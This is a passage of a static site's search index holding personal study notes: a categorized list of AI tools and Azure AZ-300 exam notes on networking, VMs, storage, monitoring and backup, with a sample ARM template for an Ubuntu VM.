[{"id":0,"href":"/ai/readme/","title":"Readme","section":"Ais","content":" AI # Tools # General Models # ChatGPT Claude Gemini DeepSeek Video Generation and Editing # Synthesia Runway Filmora OpusClip Notetakers and Meeting Assistants # Fathom Nyota NotebookLM - Study - Summerize content and find different ways to learn and process it Research # Deep Research Writing # Rytr Sudowrite Grammar and Writing Improvement # Grammarly Wordtune Search Engines # Perplexity ChatGPT Search Social Media Management # Vista Social FeedHive Image Generation # Midjourney DALLÂ·E 3 Graphic Design # Canva Magic Studio Looka App Builders \u0026amp; Coding # Bubble Bolt Lovable Cursor v0 Project Management # Asana ClickUp Scheduling # Reclaim Clockwise Customer Service # Tidio AI Hiver Recruitment # Textio CVViZ Knowledge Management # Notion AI Q\u0026amp;A Guru Email # HubSpot Email Writer SaneBox Shortwave Presentations # Gamma Presentations.ai Resume Builders # Teal Kickresume Voice Generation # ElevenLabs Murf Music Generation # Suno Udio Marketing # AdCreative Sales # Clay "},{"id":1,"href":"/azure/","title":"Azure","section":"","content":" Cloud Azure Study Notes # AZ-300 Study Notes AZ-300 Practial Notes "},{"id":2,"href":"/azure/az-300-notes/","title":"Az 300 Notes","section":"Azure","content":" AZ-300 Study Notes # Various # Global filter for subscription and (active) directory Every single resource specifies a region to be stored Azure hides more the concepts of zone\u0026rsquo;s (as in HA Zone) Zone\u0026rsquo;s are more explicit in \u0026ldquo;availability sets\u0026rdquo; Resource Groups are mandatory Zones, Regions and High Availability # Primary Source\nBusiness Continuity is the business word for HA and Recovery.\nA zone can be one ore more data centers still.\nEach region has a min of 3 zones.\nAvailability Sets\nA group with 2+ VMs in the same Data Center. Parameters Fault Domain : Each fault domain has own hardware network switch and power source. Update Domains : All VMs in same update domain restart together during planned maintenance. So the Fault Domain is a hardware logical grouping, while the update domain is a software logical grouping. Can\u0026rsquo;t add existing VMs to an availability set This is all within one 99.95% SLA Protect from hardware failures and maintenance within data centers Usually a set per tier When you create a VM you can assign it to an Availability Set Resource Availability Zones\nVMs are in different physical locations within a Region. (cross Zone) 99.99% SLA 2 Categories Zonal Services : Add a resource to a specific zone (VMs, Disks, Ips\u0026hellip;) Zone-redundant services : Atu replication accross zones (e.g. for SQL DB) Don\u0026rsquo;t support all VM sizes. Protect from enitre data center failure (so a zone that goes down) When you create a VM you can assign it to an Availability Zone number An Availability zone in an Azure region is a combination of a fault domain and an update domain.\nMeaning, the fault domain and update domains are 100% isolated between zones. You can\u0026rsquo;t have 2 VMs in different zones being on a same fault and/or update domain. Disaster recovery approaches:\nSync replication of apps and data using : Availability Zones Async replication of apps and data using : Region Pairs Cross region Azure Management services are resilient from region-level failures.\nNetworking # Virtual Network (aka VNet)\nSubnet\nCan be designated/delegated to be used by a dedicated Azure Service (Like workspaces/volumes/\u0026hellip;) A VM connects through a NIC which is assigned to the VM and connected to a subnet\nAzure provides implicitly a Internet Gateway, you don\u0026rsquo;t need to provision one like in AWS.\nOutbound connections for VMs\nVirtual Network Service Endpoints : Extend private address space and identity over a direct connection to Azure services.\nAllow a direct network connection to your other Azure resources/services without leaving Azure backbone network. Not available to all Azure services, but some examples : Storage, DB\u0026rsquo;s, Key Vault, Event relates services and App service. More secure than to have VM call a Azure service and hopping over the public internet Optimal Routing because of not making the internet hop Less IP management (like NAT\u0026rsquo;s etc) Azure service resources secured to Vnets are NOT reachable from on-premise. Because everything goes through Azure backbone network, so no public IPs as there is not internet hop. To allow this, allow public IPs or use ExpressRoute Can be connected to a specific subnet (so only the App tier can access service x) Better to define a username/password for a vm in a private tier, else the jump box needs to be configured with a *.pem file for ssh\nNetwork Security Group has stateless rules.\nNetwork Security Group vs. Application Security Group\n(NSG) Network Security Group is the Azure Resource that you will use to enforce and control the network traffic with Applied to a subnet or a virtual machine Has default rules (ASG) Application Security Group is an object reference within a Network Security Group. Used within a Network Security Group Apply a rule to specific workload or group of VMs Such a rule has a \u0026ldquo;network object\u0026rdquo; and a explicit IP address Seems that they are statefull, like the Security Group in AWS No default rules No rule order Examples Allow internet traffic (source internet) to destination Web tier (DMZ-ASG), ports 80 and 443 Allow DMZ traffic (source DMZ-ASG) to destination App tier (APP-ASG), ports xxx \u0026hellip; For a LB, you define independently a \u0026ldquo;Health Probe\u0026rdquo; which you can then refer to in a routing rule or other.\nVirtual Machines # System assigned managed identity : Like assigning a role in AWS, so a VM can access services without auth in code.\nCloud init : Script that runs when it boots the first time.\nYou cannot put a VM in a Vnet which is located in another region.\nA VM can change it\u0026rsquo;s size after having been created\nYou can give a VM a public IP and then only allow SSH access if you don\u0026rsquo;t want to use a jump box.\nWhen putting VM\u0026rsquo;s in a backend pool of a LB, and you want to SSH into it, create an Inbound NAT rule + double check inbound NSG.\nTODO : Multiple data disks, why ? (maybe one OS disk and one attached for temporary data storage, so when does that clear ? After reboot ?)\nAzure Resource Manager Templates # { \u0026#34;$schema\u0026#34;: \u0026#34;https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0.0.0\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;projectName\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Specifies a name for generating resource names.\u0026#34; } }, \u0026#34;location\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;[resourceGroup().location]\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Specifies the location for all resources.\u0026#34; } }, \u0026#34;adminUsername\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Specifies a username for the Virtual Machine.\u0026#34; } }, \u0026#34;adminPublicKey\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Specifies the SSH rsa public key file as a string. Use \\\u0026#34;ssh-keygen -t rsa -b 2048\\\u0026#34; to generate your SSH key pairs.\u0026#34; } } }, \u0026#34;variables\u0026#34;: { \u0026#34;vNetName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;projectName\u0026#39;), \u0026#39;-vnet\u0026#39;)]\u0026#34;, \u0026#34;vNetAddressPrefixes\u0026#34;: \u0026#34;10.0.0.0/16\u0026#34;, \u0026#34;vNetSubnetName\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;vNetSubnetAddressPrefix\u0026#34;: \u0026#34;10.0.0.0/24\u0026#34;, \u0026#34;vmName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;projectName\u0026#39;), \u0026#39;-vm\u0026#39;)]\u0026#34;, \u0026#34;publicIPAddressName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;projectName\u0026#39;), \u0026#39;-ip\u0026#39;)]\u0026#34;, \u0026#34;networkInterfaceName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;projectName\u0026#39;), \u0026#39;-nic\u0026#39;)]\u0026#34;, \u0026#34;networkSecurityGroupName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;projectName\u0026#39;), \u0026#39;-nsg\u0026#39;)]\u0026#34; }, \u0026#34;resources\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Network/networkSecurityGroups\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2018-11-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;networkSecurityGroupName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[parameters(\u0026#39;location\u0026#39;)]\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;securityRules\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ssh_rule\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Locks inbound down to ssh default port 22.\u0026#34;, \u0026#34;protocol\u0026#34;: \u0026#34;Tcp\u0026#34;, \u0026#34;sourcePortRange\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;destinationPortRange\u0026#34;: \u0026#34;22\u0026#34;, \u0026#34;sourceAddressPrefix\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;destinationAddressPrefix\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;access\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;priority\u0026#34;: 123, \u0026#34;direction\u0026#34;: \u0026#34;Inbound\u0026#34; } } ] } }, { \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Network/publicIPAddresses\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2018-11-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;publicIPAddressName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[parameters(\u0026#39;location\u0026#39;)]\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;publicIPAllocationMethod\u0026#34;: \u0026#34;Dynamic\u0026#34; }, \u0026#34;sku\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Basic\u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Network/virtualNetworks\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2018-11-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;vNetName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[parameters(\u0026#39;location\u0026#39;)]\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;addressSpace\u0026#34;: { \u0026#34;addressPrefixes\u0026#34;: [ \u0026#34;[variables(\u0026#39;vNetAddressPrefixes\u0026#39;)]\u0026#34; ] }, \u0026#34;subnets\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;vNetSubnetName\u0026#39;)]\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;addressPrefix\u0026#34;: \u0026#34;[variables(\u0026#39;vNetSubnetAddressPrefix\u0026#39;)]\u0026#34; } } ] } }, { \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Network/networkInterfaces\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2018-11-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;networkInterfaceName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[parameters(\u0026#39;location\u0026#39;)]\u0026#34;, \u0026#34;dependsOn\u0026#34;: [ \u0026#34;[resourceId(\u0026#39;Microsoft.Network/publicIPAddresses\u0026#39;, variables(\u0026#39;publicIPAddressName\u0026#39;))]\u0026#34;, \u0026#34;[resourceId(\u0026#39;Microsoft.Network/virtualNetworks\u0026#39;, variables(\u0026#39;vNetName\u0026#39;))]\u0026#34;, \u0026#34;[resourceId(\u0026#39;Microsoft.Network/networkSecurityGroups\u0026#39;, variables(\u0026#39;networkSecurityGroupName\u0026#39;))]\u0026#34; ], \u0026#34;properties\u0026#34;: { \u0026#34;ipConfigurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ipconfig1\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;privateIPAllocationMethod\u0026#34;: \u0026#34;Dynamic\u0026#34;, \u0026#34;publicIPAddress\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.Network/publicIPAddresses\u0026#39;, variables(\u0026#39;publicIPAddressName\u0026#39;))]\u0026#34; }, \u0026#34;subnet\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.Network/virtualNetworks/subnets\u0026#39;, variables(\u0026#39;vNetName\u0026#39;), variables(\u0026#39;vNetSubnetName\u0026#39;))]\u0026#34; } } } ] } }, { \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Compute/virtualMachines\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2018-10-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;vmName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[parameters(\u0026#39;location\u0026#39;)]\u0026#34;, \u0026#34;dependsOn\u0026#34;: [ \u0026#34;[resourceId(\u0026#39;Microsoft.Network/networkInterfaces\u0026#39;, variables(\u0026#39;networkInterfaceName\u0026#39;))]\u0026#34; ], \u0026#34;properties\u0026#34;: { \u0026#34;hardwareProfile\u0026#34;: { \u0026#34;vmSize\u0026#34;: \u0026#34;Standard_D2s_v3\u0026#34; }, \u0026#34;osProfile\u0026#34;: { \u0026#34;computerName\u0026#34;: \u0026#34;[variables(\u0026#39;vmName\u0026#39;)]\u0026#34;, \u0026#34;adminUsername\u0026#34;: \u0026#34;[parameters(\u0026#39;adminUsername\u0026#39;)]\u0026#34;, \u0026#34;linuxConfiguration\u0026#34;: { \u0026#34;disablePasswordAuthentication\u0026#34;: true, \u0026#34;ssh\u0026#34;: { \u0026#34;publicKeys\u0026#34;: [ { \u0026#34;path\u0026#34;: \u0026#34;[concat(\u0026#39;/home/\u0026#39;, parameters(\u0026#39;adminUsername\u0026#39;), \u0026#39;/.ssh/authorized_keys\u0026#39;)]\u0026#34;, \u0026#34;keyData\u0026#34;: \u0026#34;[parameters(\u0026#39;adminPublicKey\u0026#39;)]\u0026#34; } ] } } }, \u0026#34;storageProfile\u0026#34;: { \u0026#34;imageReference\u0026#34;: { \u0026#34;publisher\u0026#34;: \u0026#34;Canonical\u0026#34;, \u0026#34;offer\u0026#34;: \u0026#34;UbuntuServer\u0026#34;, \u0026#34;sku\u0026#34;: \u0026#34;18.04-LTS\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;osDisk\u0026#34;: { \u0026#34;createOption\u0026#34;: \u0026#34;fromImage\u0026#34; } }, \u0026#34;networkProfile\u0026#34;: { \u0026#34;networkInterfaces\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.Network/networkInterfaces\u0026#39;, variables(\u0026#39;networkInterfaceName\u0026#39;))]\u0026#34; } ] } } } ], \u0026#34;outputs\u0026#34;: { \u0026#34;adminUsername\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;adminUsername\u0026#39;)]\u0026#34; } } } "},{"id":3,"href":"/azure/az-300/","title":"Az 300","section":"Azure","content":" AZ 300 Microsoft Azure Architect Technologies Notes # Azure Fundamentals # AWS tp Azure Service Comparison Azure Architecture Center Some comparisons # Blob storage does the same as AWS S3 and EBS\nTable storage - Key/value like DynamoDB\nQueue Storage - Messeging for workflow and communication between components of the cloud services\nFile Storage - Similar to EFS\nLoad balancer - Similar as AWS Classic Load Balancer (level 4)\nApplication Gateway - AWS Application load balancer (application level, level 7)\nTraffic manager - DNS level traffic routing for load balancing and fail over cross geo.\nSES - In Azure use of 3th party solutions like sendgrid\nSQS - Queue Storage in Azure\nAWS Auto Scaling - VM Scale Sets\nDynamo DB - Azure Cosmos\nElastiCache - Azure Cache for Redis\nCloufFormation - Azure Resource Manager/VM extensions and Azure Automation + templates\nTrusted Advisor - Azure Advisor (analysis of cloud resource configuration and security for optimum config)\nAWS Management Console - Azure Portal\nSQS - Azure Queue Storage for between services, and Service Buss ofr Pub/Sub messaging self implemented\nSNS - Even Grid\nAWS Organizations - Management Groups + Azure Policy\nAWS SHield - Azure DDOS protection Service\nS3 - Azure Blob Storage\nEFS (Elastic File System) - Azure files\nS3 IA - Azure Storage Cool Tier\nS3 Glacier - Azure storage Archive Access Tier\nAWS Backup - Azure Backup\nElastic Beanstalk - App Service (PAAS)\nAPI Gateway - API Management\nCloudFront - Azure Content Delivery Network\nNotice that many resources (like a User Define Route) can be stored in specific locations, research if you can widely mix and match these regarding the subnets, VNets, Resource Groups\u0026hellip;\nAccounts and Subscriptions Overview # Recently added \u0026ldquo;management groups\u0026rdquo; Quotas Cost Analysis and Tagging Demonstration # Like AWS, there is TAG concept, which helps you to tag resources for billing and other purposes. So a tagging strategy is very useful. You get a lot of soft limits for quotas, and with a ticket you can increase it, just like AWS. Limits for vCPU\u0026rsquo;s, VM\u0026rsquo;s \u0026hellip; Billing Alerts # Policies # You can assign policies, (also with JSON), so that any a suscription for example, can only deploy certain type of virtual machines.\nSo we want maybe to set such \u0026ldquo;Allowed virtual Machine SKUs\u0026rdquo; for services.\nPolicies can be assigned to multiple subscriptions by using management groups.\nResource Groups and Tagging # Resource groups are an arbitrary grouping of related resources. You can put resources from another region (aside of the one defined in the resource group). But the meta data of the resource group will be stored in the defined region.\nTips for tagging\nCost center (who Pays) Business Owner Maintenance window We can also do IAM and policies on a resource group basis.\nYou can check all the deploys that happened in a Resource Group.\nA resource group has its own view, you can do deployments, policies, iam, cost, automation scripts, metrics, \u0026hellip;\nA resource group is always assigned to a subscription.\nMoving Resources Between Resource groups # You can move resources from one resource group to another.\nMetrics from monitoring are stored in a \u0026ldquo;Diagnostics Storage Account\u0026rdquo;.\nSomre resources cannot be moved, like alerts and (at the moment) managed disks.\nAzure Monitoring Overview # You can create metric filters and then pin them to your dashboard.\nWhen creating an alert, you choose the target resource(s), then what condition to trigger it, then the action group which is to notify a team via mail, text, trigger webhooks, runbooks, functions, or many others.\nA runbook is basically certain actions you dfine (like scale up) or such. This can be triggered manually or automatically.\nAzure by default monitors the host level metrics (from the hypervisor) like CPU usage and such, this is different from the guest level metrics, being the usage of certain services or programs in your OS. For this you need to install an agent on your guest OS which runs on your virtual machine.\nYou can enable guest level metrics collection in the VM \u0026gt; Monitoring \u0026gt; Diagnostic Settings \u0026gt; Enable guest level monitoring.\nITSM (IT Service Management)\nLog Analytics Key Features # Log Analytics is the layer that is used to gather all logs and then other services can query this layer. The log analytics takes care of auto storing, creating tables and everything necessary to persist data.\nData Sources (for logs)\nsource : Event Type : desc Custom Logs : _CL : Text files from the gues level agents Windows Event Logs : Event : Collected form the event logon windows computers Windows Performance Counters : Perf : Perf from windows machines Linux Performance Counters : Perf : Per from linux machines IIS Logs : W3CIISLog : IIS logs in W3C format Syslog : Syslog : Syslog events on Windows or Linux machines other ones are like Azure Activity Log and Storage account logs.\nSearch query fundamentals\nStart with the source table (e.g Event) Follow on with a series of operators (which VM) Separate out additonal operations by using pipe | Join other tables and workspaces using \u0026ldquo;union\u0026rdquo; You are charged for the service \u0026ldquo;Log Analytics\u0026rdquo;\nSeems that resource groups are often mandatory in many setups.\nYou pay for Log Anayltics per GB\nSo you create a Log Analytics workspace, here you pay per GB, you can then attach data sources, like VMs to it.\nYou can then query in the workspace, somehow you can also query accross multiple workspaces.\nLog analytics stores in a region its data.\nAgain IAM is applicable to such a workspace.\nWith the query language, you start with a source, then you always do PIPING to the next thing, like:\nPerf | where TimeGenerated \u0026gt; ago(1h) | where CounterName == @\u0026#34;% Processor Time\u0026#34; | summarize avg(CounterValue) by Computer, (bin(TimeGenerated, 1m)) | render timechart Reminds a bit of F# syntax\nFrom a query you can create an alert rule.\nCreate and Configure Storage Accounts # Like S3, storage accounts are assigned some public URL, therefore it needs to be universily unique,\nhttps://\u0026lt;your-storage-account-name\u0026gt;.\u0026lt;type\u0026gt;.core.windows.net/\u0026lt;container\u0026gt;/filename.extension Types\nGeneral Purpose v1 (GPV1)\nGeneral Purpose v2 (GPV2) - Main choice (merged GPV1 and Blob account)\nBlob account\nBlock Blob\nIdeal for storing text or binary files, a singlicke block blob can contain up to 50K blocks of up to 100MB each, max 4.75TB Append blobs are optimized for append operations (e.g. logging) Page Blob\nEfficient for read/write operations used by Azure VM\u0026rsquo;s Up to 8 TB in size. Storage Tiers\nHot (high storage costs, low access costs) Cold (lower storage costs, higher access cost, intended for data that will remain cool for 30 days or more) Archive (Lowest storage, highest access cost, when a blob is in archive storage it is offline and cannot be read) Choosing between Blobs, Files and Disks\nBlobs : Access app data from anywhere, large amount of objects to store images, video Files : Access files across multiple machines, jumpbox scenarioas for shared development scenarios Disks : Do not need to access data outside of the VM, Disk expansion for application installations Storage accounts must have unique names across Azure (like a bucket on AWS).\nReplication Locally redundant Storage (LRS) - 3 copies in the same zone Zone redundant Storage (ZRS) - 3 copies across different zones but same region Geo redundant Storage (GRS) (Cross zone) - 6 copies accross multiple regions Read Access Geo Rendundant Storage (RA-GRS) - replicate to another region for reading A storage account can be allowed to a single VPC or to all of your VPCs.\nThe Secure transfer flag enforces access to be over HTTPS and other equivalents depending the type of access.\nYou can use Azure Storage Explorer for managing files, uploading, viewing, get urls, and such. You also have azcopy CLI to copy from and to a storage account.\nManaging Access: Container permissions\nPublic Access level : By default disabled for obvious reasons Levels: Private Blob (anonymous read access for blobs only) Container (anonymous read access for containers and blobs), public access to the entire container We can have more granular access management\nShared Access Signature Is is a query string that we add on to the url of the storage resources string informs Azure what access should be granted (basically signed urls) Utilized a hash based message auth (again, typical signed url) The SAS can be used as Account SAS Tokens Granted at the account level to grant permissions to services within the account. (Service to Service communication) Service SAS Tokens Grants access to a specific service within a storage account Breakdown\nhttps://\u0026lt;your-storage-account-name\u0026gt;.\u0026lt;type\u0026gt;.core.windows.net/\u0026lt;container\u0026gt;/filename.extension ?sv=2017-7-29 # Storage service version \u0026amp;ss=bfqt # Signed services (Blob, File, queue, Table) \u0026amp;srt=sco # Signed Resource Types (Service, Container, Object) \u0026amp;sp=rwdlacup # Signed Permission (Read, Write, Delete, List, Add, Create, Update, Process) (process is queue messages) \u0026amp;se=UTCTIMESTR # Signed Expiry \u0026amp;st=UTCTIMESTR # Signed Expiry \u0026amp; Start \u0026amp;spr=https # Signed Protocol \u0026amp;sig=... # Signature hash You can create a Access Policy that a SAS refers to. Since the SAS refers to an policy, you can change the policy itself dynamically.\nEncryption Keys and Key Vault\nHSM : Hardware Security Modules\nSSE : Service Encryption\nCustom Domains\ne.g. have http://acloud.guru instead of http://account.blob.core.windows.net *can also points directly a specific container)\nIt\u0026rsquo;s all DNS anyway!\n2 ways to do this\nCreate a CNAME record with your DNS provider that points from Your Domain (eg www.yourdomain.com to youraccount.blob.core.windows.net) - Simple but results in brief downtime as Azure verifies the registration of your domain \u0026ldquo;asverify\u0026rdquo; subdomain (verify.yourdomain.com to asverify.youraccount.blob.core.windows.net) When step complete, create CNAME record that points to youraccount.blob.core.windows.net No downtime This is the indirect CNAME validation Azure Import/export Use Cases\nData Migration to the cloud (large amounts of data to azure)\nContent Distribution (sending data to customer sites)\nBackup (backup on premise data)\nData Recovery (send data from data center to on premise data centers)\nImport/export service\nAccess via Azure Portal Used to track data import (upload) jobs Used to track data export (download) jobs CLI for\nPrep disk drives that are shipped Copying data to your drive Encrypts data with BitLocker Generates drive journal files Determine number of drives Use V1 for blob and V2 for files\nDisk Drives\nHDD SSD Import jobs: You ship drives containing your data Export Jobs: You ship empty drives Business Continuity Strategies\nHigh Availability (Run another instance of apps in case of catastrophic failure) (proactive)\nDisaster Recovery (Run apps in secondary datacenter if a failure occurs) (reactive)\nBackup (Restore your data)\nAzure Backup\nBackup solution purpose builft for Cloud Unlimited Scaling Unlimited Data Transfer Multiple Storage Options (LRS/GRS) Long Term Retention Application-Consistent Backups Data Encryption Azure Backup Components (read about them in the docs!)\nAzure Backup (MARS) Agent System Center DPM (Data Protection Manager) Azure Backup Server Azure IaaS VM Backup Other Recovery Options (more manual)\nSnapshot recovery Blob snapshots taken of VM page blob Snapshots can be copied into the same or different regions VMs get created from snapshot Application consistent if VM was shutdown, otherwise crash-consistent Geo Replication Uses Azure storage GRS Data is replicated to a paired region far away from the primary copy Data recovery in the event of an outage or entire region unavailable RA-GRS option available as well Virtual Machines # Azure uses hypervisor for the VM\nBilled per second\nAWS EBS === Azure Storage for VM Disks\nTypes\nA - Basic : Basic version of the A series for testing and development. A - Standard : General-purpose VMs B - Burstable : Burstable instances that can burst to the full capacity of the CPU when needed. (typicall webservers, check sth with cpu credits) D - General Purpose : Built for enterprise applications. DS instances offer premium storage. E - Memory optimized : High memory-to-cpu core ratio. Es instances offer premium storage. F - CPU Optimized : High CPU core-to-memory ratio. FS instances offer premium storage. G - Godzilla : Very large instances ideal for large databases and big data use cases. H - High performance compute : Aimed at very high-end computational needs such as molecular modelling and other scientific applications. L - Storage optimized : Offer higher disk throughput and IO. M - Large memory : Another large-scale memory option that allows for up to 3.5 TB of ram. N - GPU Enabled : has GPU SAP HANA : Specialized instances built and certificied for running SAP HANA. Could be that a policy or subscription does not allow you to use certain types Specializations\nS : Premium Storage options (eg. DSv2) M : Larger memory (eg. A2m_v2) R : Supports remote direct memory access (RDMA) (eg. H16mr) Azure Compute Inits (ACUs)\nWay to compare CPU performance between different types/size of VM Microsoft created performance benchmark. Eg. A VM with ACU of 200 has twice the performance of a VM with an ACU of 100. Supported workloads\nWindows Server Support Pre-windows 2008 R2 Supported Must bring own image No marketplace support Need to have your own custom support agreement (CSA) Windows Server 2008 R2 Supported Specific support matrix for server roles. Windows Server 2012 : Supported, datacenter version in marketplace Windows Server 2016 : Supported, datacenter and nano versions in marketplace. Desktop OS : PRo and Enterprise in marketplace Read Article !! Linux Server Support CentOS CoreOS Debian Oracle Linux Red Hat Enterprise Linux SUSE Linux Enterprise OpenSUSE More Info There are regional limitations on VM types based on region\nRegion sets relate to deployment (eg EAST US and WEST US). They would always first patch the one region, once done, the other, never at the same time.\nImportant to take in account to avoid at all cost There is a list of restricted usernames for your VMs\nEg. Administrator, admin, user, user, test, david, gues, root, server, sql, john, backup, console, \u0026hellip; and more Setting up a VM\nWindows OS always requires username/pass, while linux, you can also choose a SSH key Availability Options No redundancy Availability set : Same data center, but 2 VMs in separate racks and power supply and separate networking Availability zone : In separate data centers Azyre Hybrid : Benefit to use on premise windows server license and run windows VM at reduced cost. (but need Software Assurance or sth) Disks By default a VM has a OS and temporary (ephemeral?) disk for short term storage. Additional data disks can be added When adding data disk, you can use a Snapshot or storage blob as source By default disks are managed (see advance section) Networking PublicIP can be assigned but you can choose not too Sugnet is mandatory and the VPC (or rather Virtual Network) NIC : Network Interface Card NIC Network security group (TODO read more !) Ideally one Network Security Group assigned per Subnet (is the general advice) Accelerator netorking is only on specific VM types and OS\u0026rsquo;s (bypassed a certain virtualization layer) YOu can always put immediatly a VM in a pool behind a load balancer Management System assigned managed identity : This is like a AWS Role, so other azure services can authenticate You can enable built in backup Tags obviously At the end you can download the template for later automation During deployment you can check the inputs/outputs and the template VM\nConnect over RDP with Windows SSH for linux CLI with powershell WinRM Create a key vault Create a self-signed certificate Upload certificate to the Key vault. Get the url for your certificate from the key vault Reference your self-signed certificate when you create the VM VM Storage\nDisks can be encrypted (in-rest) YOu can always attach disks once running (don\u0026rsquo;t forget to mount it in the guest OS) Types Standard HDD Traditional HDD Most cost effective Throughput based on VM IOPS based on VM Standard SSD SSD Recommended for most Max throughput 500MB/S per disk Max IOPS 2000 IOPS per disk Premium SSD SSD Higher performance, lowest latency Max 750 MB/s per disk Max IOPS 7500 IOPS per disk Ultra SSD - in preview Managed Disk - Standard sizes the size impacts the throughput and IOPS, therefore an estimated performance is shown when choosing size S4 - 32 GB S6 - 64 GB S10 - 128 GB S20 - 512GB And many more\u0026hellip; ! IOPs and throughput are not provisioned and depend ong the performance of the VM. VM LIMITS Make sure that your VM can handle your bandwith, because the VM itself can be the weakest link in the chain of throughput and IOPS. (VM can be limited itself technically or by design) Managed vs Unmanaged Disks Unmanaged Disk (DIY) DIY - Manage storage account Managment overhead (20000 IOPS per storage account limit) Supports all replication modes (LRS, ZRS, GRS RA-GRS) Managed Disk Simple (don\u0026rsquo;t worry about the storage account) Lower management overhead as Azure manages the storage accounts Only LRS replication mode (currently) - but you can have backup to ZRS, GRS or RA-GRS. Disk Caching Method for improving performance of a Virtual HD (VHD) Utilizes local RAM and SSD drives on underlying VM host (the actual barebone) Available on standard and premium disk Types Read-Only Caching : Improve latency and potentially gain higher IOPS per disk Read-Write Caching : Ensure you have a proper way to write data from cache to persistent disks Default/allowed settings OS - Default \u0026ldquo;Read-Write\u0026rdquo; - Allowed \u0026ldquo;Read-Only or Read-Write\u0026rdquo; Data - Default \u0026ldquo;None\u0026rdquo; - Allowed \u0026ldquo;None, Read-Only, or Read-Write\u0026rdquo; At this time you can change only the disk caching via Powershell, not via Portal Azure VM Networking\nOne NIC can be attached to a VPC and subnet, attached/detacched as needed Network security groups can be attached to a NIC or to a subnet You can customize the DNS for a NIC, but by default it inherits from the Virtual Network I think the Network Security Group is equivalent to NACL Availability Sets\nTODO : Compare the limitations of VPC/SUBNET limitations with the Virtual Network/SUBNET limitations regarding regions and zones. TODO : Read more on this availability sets VS AWS Availability sets can be directly mapped to a backend pool of a Load Balancer Potential for VM Impact Planned Maintenance Unplanned Hardware maintenance Unexpected Downtime With Availability sets Group two or more machines in a set Separated based on fault Domains and Update Domains An availability set can have up to 3 Fault domains. Each fault domain is a different rack with own power and networking connectivity. This is for teach, downtime Update domains is to make sure when they patch stuff, they never patch the same update domains at the same time. One availability set per TIER ? (WEB/APP/DATA) - YES Scale Sets Horizontal scaling Virtual Machine Scale Sets (VMSS) This can be auto scaling or fixed scale or schedule Auto scaling can be on simple metrics like CPU Usage, but also in application metrics Networking # Vnet : Virtual Network\nNSG : Network Security Group on a Subnet (similar to NACL)\nRevise subnetting/masking again (10.0.0.0/24) CIDR\nWhen creating a subnet, you don\u0026rsquo;t assign a Zone, unlike in AWS, in AWS a subnet resides explicitly in a ZOne\nSome addresses in a subnet are always reserved by Azure\nYou need to know Powershell commands for the exam ð\nDHCP only allocates IP address to a resources until its created\nIP address only deallocated 